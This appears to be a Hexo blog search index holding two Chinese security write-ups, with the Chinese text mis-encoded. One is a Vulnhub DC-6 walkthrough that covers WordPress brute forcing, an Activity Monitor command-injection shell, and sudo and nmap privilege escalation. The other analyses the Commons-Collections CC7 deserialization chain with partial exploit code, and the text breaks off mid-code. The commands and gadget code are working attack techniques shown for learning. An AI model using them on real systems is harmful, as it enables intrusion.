<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Vulnhub-DC-6</title>
      <link href="/undefined/18859.html"/>
      <url>/undefined/18859.html</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>ä¸‹è½½åœ°å€ï¼š<a href="https://download.vulnhub.com/dc/DC-6.zip">https://download.vulnhub.com/dc/DC-6.zip</a></p><h2 id="å¼€å§‹æ‰“é¶"><a href="#å¼€å§‹æ‰“é¶" class="headerlink" title="å¼€å§‹æ‰“é¶"></a>å¼€å§‹æ‰“é¶</h2><p>å­˜æ´»IPæ‰«æ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091912733.png" alt="image-20230709190836443"><br>è®¿é—®IPæ˜¾ç¤ºåŸŸåä½†æ— æ³•è§£æï¼Œå’Œå‰é¢æœ‰å°DCé¶æœºä¸€æ ·ï¼Œè¿™é‡Œæˆ‘åœ¨winä¸‹ä¿®æ”¹hostsæ–‡ä»¶ï¼Œæ‰“å¼€è¿™ä¸ªæ–‡ä»¶<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091913352.png" alt="image-20230709191335290"><br>ç„¶åæ­£å¸¸è®¿é—®ï¼Œç½‘ç«™æ˜¯WordPressçš„CMSï¼Œç›´æ¥æ°¸wpscanå…ˆæ‰«ä¸€æ³¢ï¼Œè¿™ä¸ªç«Ÿç„¶æ²¡æ‰«åˆ°ç™»å½•ç•Œé¢ï¼Œdirsearchå†æ‰«ä¸€æ³¢æ‰¾åˆ°<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091913908.png" alt="image-20230709191345851"><br>å†ä½¿ç”¨wpscanæ‰«ä¸€æ³¢ç”¨æˆ·åï¼Œå¾—åˆ°5ä¸ªç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url wordy -e u</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091913053.png" alt="image-20230709191354956"><br>ç„¶åæ˜¯çˆ†ç ´å¯†ç  ï¼Œè¿™é‡Œvulnhubç»™äº†æç¤ºè®©ç”¨å“ªä¸ªå­—å…¸</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">OK, this isn&#x27;t really a clue as such, but more of some &quot;we don&#x27;t want to spend five years waiting for a certain process to finish&quot; kind of advice for those who just want to get on with the job.</span><br><span class="line"></span><br><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt That should save you a few years. ;-)</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå»ç”Ÿæˆä¸€ä¸‹å­—å…¸ï¼Œè¿™é‡Œæ–°ç‰ˆkaliå¯èƒ½æ²¡ç”¨è§£å‹è¿™ä¸ªæ–‡ä»¶éœ€è¦è§£å‹ä¸€ä¸‹ï¼Œç”Ÿæˆå‘½åç›´æ¥ç”¨æç¤ºçš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span><br></pre></td></tr></table></figure><p>ä¸è¦copyæ•°æ®æœ‰ç‚¹å¤šğŸ¤”ï¼Œç„¶åå»çˆ†ç ´å§ï¼Œè¿™é‡Œè·¯å¾„ä»€ä¹ˆçš„è‡ªå·±è¦æ³¨æ„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url wordy --enumerate u -P passwords.txt</span><br></pre></td></tr></table></figure><p>å¾—åˆ°è´¦å·å¯†ç <code>mark helpdesk01</code>ç„¶åç™»å½•ä¸Šå»å‘ç°æœ‰ä¸ªActivity monitorçœ‹wpè¯´è¿™ä¸ªæ˜¯æœ‰æ¼æ´çš„<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091914208.png" alt="image-20230709191455156"></p><h2 id="æ‹¿shell"><a href="#æ‹¿shell" class="headerlink" title="æ‹¿shell"></a>æ‹¿shell</h2><p>è¿™ä¸ªæˆ‘ä¹Ÿæ²¡æ¥è§¦è¿‡ï¼Œçœ‹é¡µé¢å¥½åƒæ˜¯ä¸ªç™»å½•æ—¥å¿—åŠŸèƒ½ï¼Œmsfæœä¸€ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091914719.png" alt="image-20230709191440660"><br>ç”¨è¿™ä¸ªå°è¯•ä¸€ä¸‹ï¼Œå…ˆcopyçœ‹çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/45274.html 45274.html</span><br></pre></td></tr></table></figure><p>æ‰“å¼€çœ‹åˆ°æœ‰ä¸ªåå¼¹shellçš„ä»£ç <br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091915132.png" alt="image-20230709191509096"><br>é‚£ä¹ˆæŠŠåŸŸåå’ŒIPæ”¹ä¸€ä¸‹å°±è¡Œï¼Œç„¶åå°±åˆ©ç”¨å¤±è´¥ï¼Œæ²¡åŠæ³•æ‰‹åŠ¨æ¥å§ï¼ŒæŠ“ä¸ªå‘½ä»¤æ‰§è¡Œç‚¹çš„åŒ…å¦‚ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091915091.png" alt="image-20230709191524042"><br>æ·»åŠ è¦æ‰§è¡Œçš„å‘½ä»¤<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091915307.png" alt="image-20230709191535273"><br>æ‹¿åˆ°shellåˆ©ç”¨pythonè½¬æ¢ä¸ºäº¤äº’å¼shellï¼Œç„¶åå°±æ˜¯ææƒäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>å…ˆçœ‹ä¸€ä¸‹å“ªäº›å‘½ä»¤å…·æœ‰suidæƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>æ²¡å‘ç°æˆ‘ç†Ÿæ‚‰çš„ä¸œè¥¿ï¼Œè¿›å…¥homeç›®å½•çœ‹çœ‹ï¼Œé€šè¿‡ä¸€ç•ªç›®å½•æŸ¥çœ‹æ‰¾åˆ°äº†æç¤ºæ–‡ä»¶things-to-do.txt<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091915324.png" alt="image-20230709191549243"><br>å¾—åˆ°äº†grahamç”¨æˆ·çš„å¯†ç ï¼Œé‚£ä¹ˆå»è¿™ä¸ªç”¨æˆ·ä¸‹çœ‹çœ‹ï¼Œç¿»äº†ä¸‹æ–‡ä»¶æ²¡å•¥ä¸œè¥¿ï¼ŒæŸ¥çœ‹å½“å‰ç”¨æˆ·çš„æƒé™<code>sudo -l</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091916387.png" alt="image-20230709191602340"><br>è¿™ä¸ªç”¨æˆ·å¯ä»¥ä»¥jensç”¨æˆ·æ¥è¿è¡Œbackups.shå…ˆæ‰“å¼€çœ‹çœ‹ï¼Œå‘ç°æ²¡å•¥ä¸œè¥¿ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥è¿›è¡Œå†™å…¥æ“ä½œï¼Œé‚£ä¹ˆå†™å…¥<code>echo &quot;/bin/bash&quot; &gt;&gt; backups.sh</code>è¿™æ ·èƒ½å°†shellåˆ‡æ¢åˆ°jensç”¨æˆ·ï¼Œå†™å…¥åä»¥jensç”¨æˆ·æ‰§è¡Œæ–‡ä»¶<code>sudo -u jens ./backups.sh</code>æˆåŠŸåˆ‡æ¢shell<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091916468.png" alt="image-20230709191616408"><br>é‚£ä¹ˆå†æŸ¥çœ‹ä¸€ä¸‹å½“å‰ç”¨æˆ·çš„æƒé™<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091916466.png" alt="image-20230709191631408"><br>å¯ä»¥ç”¨rootæ¥è¿è¡Œnmapå¹¶ä¸”ä¸éœ€è¦å¯†ç ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨nmapææƒï¼Œnmapæœ‰æ‰§è¡Œè„šæœ¬çš„åŠŸèƒ½ï¼Œé€šè¿‡ç¼–å†™ç‰¹æ®Šè„šæœ¬ï¼Œå¯ä»¥å®ç°åˆ©ç”¨nmapææƒ<br>è¿™é‡Œnmapææƒåˆ†äº†ä¸¤ç§ï¼Œå…¶å®å°±æ˜¯ä¸åŒç‰ˆæœ¬ä¸‹çš„æ–¹å¼</p><ol><li>æ—§ç‰ˆæœ¬ææƒ<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># è¿›å…¥nmapçš„äº¤äº’æ¨¡å¼</span><br><span class="line">nmap --interactive</span><br><span class="line"># æ‰§è¡Œshï¼ŒææƒæˆåŠŸ</span><br><span class="line">!sh</span><br></pre></td></tr></table></figure></li><li>æ–°ç‰ˆæœ¬ææƒ<br>å†™å…¥ä¸€ä¸ªæ‰§è¡Œbashçš„nmapè„šæœ¬ï¼Œè¿è¡Œ<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp)</span><br><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; $TF</span><br><span class="line">sudo nmap --script=$TF</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091916759.png" alt="image-20230709191645705"><br>ææƒæˆåŠŸï¼Œæ‹¿flag<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091916290.png" alt="image-20230709191657223"></li></ol>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå­¦ä¹ ä¹‹CCé“¾7</title>
      <link href="/undefined/45911.html"/>
      <url>/undefined/45911.html</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>CommonsCollections 3.1 - 3.2.1ï¼Œjdkå¥½åƒæ˜¯æ²¡æœ‰é™åˆ¶çš„</p><h2 id="é“¾å­åˆ†æ"><a href="#é“¾å­åˆ†æ" class="headerlink" title="é“¾å­åˆ†æ"></a>é“¾å­åˆ†æ</h2><p>è¿™é‡Œå…¶å®ååŠéƒ¨åˆ†å’ŒCC1ä¹Ÿæ˜¯ä¸€æ ·åªä¸è¿‡å…¥å£ç‚¹å˜äº†ï¼Œè¿™é‡Œä¸º<code>Hashtable</code>è¿™ä¸ªç±»ï¼Œæ‰¾æ ·æ˜¯æŠŠä»–å’Œ<code>LazyMap</code>è¿èµ·æ¥ï¼Œä½†æ˜¯è¿™é‡Œä¸ç›´æ¥å»find usagesäº†ï¼Œå› ä¸ºgetè°ƒç”¨å®åœ¨å¤ªå¤šäº†ï¼Œæ‰€ä»¥ç›´æ¥çœ‹ï¼Œæœ€åæ˜¯æ‰¾åˆ°äº†<code>AbstractMap</code>ç±»ï¼Œå®ƒçš„<code>equals()</code>æ–¹æ³•è°ƒç”¨äº†<code>get()</code>æ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091350772.png" alt="image-20230709134923730"><br>é‚£ä¹ˆä¸‹ä¸€æ­¥å°±æ˜¯æ‰¾è°è°ƒç”¨äº†<code>equals()</code>æ–¹æ³•ï¼Œä»è¿™é‡Œå¼€å§‹ä¼šé‡åˆ°å‰é¢å‡ æ¡é“¾æ²¡æœ‰è¿‡çš„è°ƒç”¨æ–¹å¼å°±æ˜¯è°ƒç”¨å­ç±»æ²¡æœ‰çš„æ–¹æ³•é‚£ä¹ˆå°±ä¼šå»åˆ°çˆ¶ç±»è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œ<code>HashMap</code>è¿™ä¸ªç±»ç»§æ‰¿äº†<code>AbstractMap</code>ç±»<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091350873.png" alt="image-20230709135028795"><br>è€Œ<code>HashMap</code>ç±»æ²¡æœ‰<code>equals()</code>æ–¹æ³•é‚£ä¹ˆè°ƒç”¨<code>HashMap</code>ç±»<code>equals()</code>æ–¹æ³•å°±ä¼šè°ƒåˆ°<code>AbstractMap</code>ç±»çš„<code>equals()</code>æ–¹æ³•æ‰€ä»¥æ¥ä¸‹æ¥å°±å»å¯»æ‰¾è°ƒç”¨äº†<code>key.equals</code>æˆ‘ä»¬æ§åˆ¶keyçš„ç±»å‹ä¸ºHashMapå°±è¡Œäº†ï¼Œæœ€ç»ˆæ˜¯åœ¨<code>HashTable</code>ç±»çš„<code>reconstitutionPut()</code>æ–¹æ³•è°ƒç”¨äº†<code>key.equals</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091350009.png" alt="image-20230709135043925"><br>å…¶å®è¿™é‡Œ<code>equals</code>çš„è°ƒç”¨è¿˜æ˜¯æŒºç»•çš„ï¼Œä¸€å¼€å§‹æ˜¯ä¼ LazyMapå¯¹è±¡åˆ°<code>AbstractMap</code>ç±»å»è°ƒç”¨<code>equals</code>å°±ç›¸å½“äºLazyMapè°ƒç”¨<code>equals</code>ä½†æ˜¯LazyMapæ²¡æœ‰<code>equals</code>æ‰€ä»¥å°±å»LazyMapçš„çˆ¶ç±»<code>AbstractMapDecorator</code>æ‰¾è™½ç„¶<code>AbstractMapDecorator</code>æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œä½†å®ƒå®ç°äº†<code>equals</code>æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object object)</span> &#123; </span><br><span class="line"><span class="comment">//åˆ¤æ–­å½“å‰å¯¹è±¡ä¸ä¼ å…¥å¯¹è±¡æ˜¯å¦ä¸ºåŒä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line">    <span class="keyword">if</span> (object == <span class="built_in">this</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> map.equals(object);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>AbstractMapDecorator</code>ç±»çš„<code>equals</code>æ–¹æ³•åªæ¯”è¾ƒäº†è¿™ä¸¤ä¸ªkeyçš„å¼•ç”¨ï¼Œå¦‚æœä¸æ˜¯åŒä¸€å¯¹è±¡ä¼šå†æ¬¡è°ƒç”¨<code>equals</code>æ–¹æ³•ï¼Œmapæ˜¯é€šè¿‡<code>LazyMap</code>ä¼ è¿‡æ¥çš„ç›¸å½“äºæ˜¯<code>LazyMap</code>çš„å¯¹è±¡ï¼Œæˆ‘ä»¬åœ¨æ„é€ åˆ©ç”¨é“¾çš„æ—¶å€™ï¼Œé€šè¿‡<code>LazyMap</code>çš„é™æ€æ–¹æ³•<code>decorate</code>å°†<code>HashMap</code>ä¼ ç»™äº†mapå±æ€§ï¼Œå› æ­¤è¿™é‡Œä¼šè°ƒç”¨<code>HashMap</code>çš„<code>equals</code>æ–¹æ³•ã€‚æ‰€ä»¥åˆå»<code>AbstractMapDecorator</code>çˆ¶ç±»å³<code>AbstractMap</code>ç±»æ‰¾æœ€ç»ˆæ‰¾åˆ°è°ƒç”¨äº†<code>equals</code>ç„¶åå†<code>AbstractMap</code>ç±»å»è°ƒç”¨<code>LazyMap</code>è°ƒç”¨getï¼Œè¿™é‡Œæƒ³äº†åŠå¤©<code>AbstractMapDecorator</code>ç±»æ€ä¹ˆå’Œ<code>HashMap</code>æ‰¯ä¸Šå…³ç³»çš„<br>ç°åœ¨å°±æ˜¯æ‰¾è°è°ƒç”¨äº†<code>reconstitutionPut()</code>æ–¹æ³•ï¼Œæœ€ç»ˆåœ¨åŒä¸€ä¸ªç±»å³<code>HashTable</code>ç±»çš„<code>readObject()</code>æ–¹æ³•è°ƒç”¨äº†<code>reconstitutionPut()</code>æ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091351732.png" alt="image-20230709135106646"><br>é‚£ä¹ˆåˆ°è¿™é‡Œé“¾å­å°±åˆ†æå®Œäº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091351548.png" alt="image-20230709135114488"></p><h2 id="EXPè°ƒè¯•"><a href="#EXPè°ƒè¯•" class="headerlink" title="EXPè°ƒè¯•"></a>EXPè°ƒè¯•</h2><p>è¿™é‡Œå…ˆæŠŠCC1çš„ååŠæ®µæ‹¿è¿‡æ¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.util.AbstractMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæ˜¯å’Œ<code>AbstractMap</code>ç±»è¿èµ·æ¥ä½†æ˜¯è¿™ä¸ªç±»æ˜¯ä¸å¯ä»¥åºåˆ—åŒ–çš„ï¼Œæ‰€ä»¥è¿™é‡Œä¸å¤ªå¥½å†™è¿™ä¸€éƒ¨åˆ†çš„expå°±ç›´æ¥å¾€åå§ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯å’Œå…¥å£ç±»çš„<code>reconstitutionPut</code>æ–¹æ³•ç»“åˆèµ·æ¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;  </span><br><span class="line">    <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯¹ä¼ è¿›çš„ Entry å¯¹è±¡æ•°ç»„è¿›è¡Œäº†å¾ªç¯ï¼Œé€ä¸ªè°ƒç”¨<code>e.key.equals(key)</code>ï¼Œè¿™é‡Œä¼ è¿›å»çš„å‚æ•°keyå¦‚æœæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œé‚£ä¹ˆ<code>AbstractMap.equals()</code>ä¸­çš„må°±æ˜¯æˆ‘ä»¬å¯æ§çš„ã€‚é‚£ä¹ˆè¿™é‡Œåœ¨å…¥å£ç±»ä¼ å…¥æ¶æ„keyç„¶åè°ƒç”¨<code>key.equals</code>å°±å¯è¡Œï¼Œåƒä¸‹é¢è¿™æ ·<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091351569.png" alt="image-20230709135145421"><br>ä½†ç»“æœæ˜¯æ²¡ååº”ï¼Œè¯´æ˜è¿™æ ·ä¸è¡Œdebugå‘ç°æ ¹æœ¬ä¸ä¼šè¿›å…¥<code>equals</code>æ–¹æ³•ï¼Œå»çœ‹çœ‹ysoå®˜æ–¹é“¾å­<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091351189.png" alt="image-20230709135138136"><br>è¿™é‡Œç”¨äº†ä¸¤ä¸ªmapå¹¶ä¸”ä½¿ç”¨äº†ä¸¤æ¬¡putï¼Œä¸‹é¢å°±åˆ†æä¸€ä¸‹ä¸ºä»€ä¹ˆè¦è¿™æ ·åšï¼Œè¿™é‡Œå¯ä»¥è¯¦ç»†äº†è§£ä¸€ä¸‹<code>reconstitutionPut</code>æ–¹æ³•ï¼Œ<a href="https://blog.csdn.net/qq_35733751/article/details/119862728">å‚è€ƒåšå®¢</a>è¿™é‡Œå°±ä¸é‡å¤å†™äº†</p><ul><li><strong>ä¸ºä»€ä¹ˆè¦è°ƒç”¨ä¸¤æ¬¡put</strong><br>å› ä¸ºæˆ‘ä»¬éœ€è¦è¿›å…¥åˆ°<code>reconstitutionPut()</code>æ–¹æ³•é‡Œé¢çš„forå¾ªç¯å»è°ƒç”¨<code>e.key.equal()</code>ä½†æ˜¯å‘ç°<br>ç¬¬ä¸€æ¬¡è°ƒç”¨çš„æ—¶å€™ç›´æ¥è·³å‡ºäº†forå¾ªç¯å› ä¸ºè¿™ä¸ªæ—¶å€™<code>tab[index]</code>ä¸ºç©ºï¼Œç„¶ååœ¨åé¢æ‰ç»™<code>tab[index]</code>èµ‹å€¼ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦è°ƒç”¨ä¸¤æ¬¡æ¥ç¡®ä¿è¿›å…¥forå¾ªç¯<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091352691.png" alt="image-20230709135205523"><br>ç„¶åè¿™é‡Œè¿˜æœ‰ä¸ª<code>e.hash == hash</code>åˆ¤æ–­ï¼Œåœ¨åˆ¤æ–­é‡å¤å…ƒç´ çš„æ—¶å€™æ ¡éªŒäº†ä¸¤ä¸ªå…ƒç´ çš„hashå€¼æ˜¯å¦ä¸€æ ·ï¼Œä¸ºçœŸåæ‰ä¼šæ‰§è¡Œåˆ°<code>e.key.equal()</code>ï¼Œè€Œè¿™ä¸ªå–å‡ºæ¥åˆ¤æ–­çš„å…¶å®å°±æ˜¯lazyMap1å¯¹è±¡çš„hashå€¼å®ƒè¦ç­‰äº ç°åœ¨çš„å¯¹è±¡ä¹Ÿå°±æ˜¯ lazyMap2 çš„hashå€¼ï¼Œè¿™ä¸ªhashå€¼æ˜¯åœ¨lazyMapå¯¹è±¡ä¸­çš„ <code>key.hashCode()</code> å¾—åˆ°çš„ï¼Œè€Œåœ¨è¿™é‡Œæˆ‘ä»¬putåˆ°lazyMap1çš„å€¼yyç„¶åå»è®¡ç®— <code>&quot;yy&quot;.hashCode()</code> ï¼ŒlazyMap2 çš„ä¸ºzZå°±å†<code>&quot;zZ&quot;.hashCode()</code>è¿™æ ·ç»è®¡ç®—ä»–ä»¬çš„hashå€¼æ˜¯ä¸€æ ·çš„ï¼Œå½“ç„¶è¿™é‡Œå¯ä»¥ç”¨å…¶å®ƒå­—æ¯ç»„åˆä¸ä¸€å®šæ˜¯è¿™ä¸¤ä¸ªï¼Œå‚è€ƒ<a href="https://blog.csdn.net/qq_64201116/article/details/128401981">æ¸…é£å¸ˆå‚…çš„åšå®¢</a>é‡Œé¢è¯¦ç»†è§£é‡Šäº†è¿™é‡Œçš„è®¡ç®—åŸç†<br>ç„¶åè¿™é‡Œè¿˜æœ‰ä¸ªé—®é¢˜ï¼Œå°±æ˜¯åœ¨<code>HashTable.put()</code> ä¹‹åéœ€è¦åœ¨map2<code>remove()</code> æ‰ yyå› ä¸º <code>HashTable.put()</code> ä¹Ÿä¼šè°ƒç”¨åˆ° <code>equals()</code> æ–¹æ³•ï¼Œå½“è°ƒç”¨å®Œ <code>equals()</code> æ–¹æ³•åï¼ŒLazyMap2 çš„ key ä¸­å°±ä¼šå¢åŠ ä¸€ä¸ª yy é”®ï¼Œåºåˆ—åŒ–çš„æ—¶å€™æ²¡é—®é¢˜å¦‚ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091353231.png" alt="image-20230709135354102"><br>ä½†æ˜¯ååºåˆ—åŒ–<code>m.size()</code>å°±ä¼šå˜ä¸º2ä½†æ˜¯åŸæœ¬çš„sizeè¿˜æ˜¯1<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091354645.png" alt="image-20230709135419679"><br>ç„¶åå°±ç›´æ¥falseäº†ä¸ä¼šè¿›å…¥åˆ°getæ–¹æ³•é‚£ä¹ˆä¹Ÿå°±ä¸ä¼šå‘½ä»¤æ‰§è¡Œäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è¿›å…¥forå¾ªç¯åå°±éœ€è¦ç§»é™¤yyï¼Œæœ€åé¿å…æœ¬åœ°åºåˆ—åŒ–ä¼šå¼¹è®¡ç®—å™¨çš„å¹²æ‰°åœ¨åºåˆ—åŒ–çš„è¿‡ç¨‹ä¿®æ”¹ä¸ºå¸¸æ•°ï¼Œå› ä¸ºHashtable#put ä¸­ä¹Ÿä¼šè°ƒç”¨åˆ° AbstractMap#equals ä»è€Œè§¦å‘ LazyMap#getï¼Œç„¶åååºåˆ—åŒ–çš„æ—¶å€™é€šè¿‡åå°„ä¿®æ”¹å›æ¥å°±è¡Œ<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 